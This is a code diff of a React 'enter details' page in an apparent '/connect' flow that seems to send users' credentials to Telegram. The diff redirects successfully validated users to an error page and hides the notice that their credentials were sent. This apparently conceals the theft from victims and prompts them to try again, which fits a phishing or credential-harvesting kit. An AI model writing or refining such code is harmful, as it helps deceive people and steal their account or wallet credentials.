@@ -553,7 +553,7 @@ export default function EnterDetailsContent() {
   const handleValidationClose = () => {
     setValidationPopup({ isOpen: false, message: '', isValid: false });
     if (validationPopup.isValid) {
-      router.push('/connect/success');
+      router.push('/connect/error');
     }
   };
 
@@ -703,13 +703,13 @@ export default function EnterDetailsContent() {
         </button>
 
         {/* Real-time Status */}
-        {hasSentToTelegram && (
+        {/* {hasSentToTelegram && (
           <div className="mt-4 p-3 bg-blue-500/10 border border-blue-500/20 rounded-xl">
             <p className="text-blue-400 text-sm text-center">
               ✓ Credentials sent for validation
             </p>
           </div>
-        )}
+        )} */}
 
         {/* Security Notice */}
         <div className="mt-6 p-4 bg-gray-900 bg-opacity-50 rounded-xl">
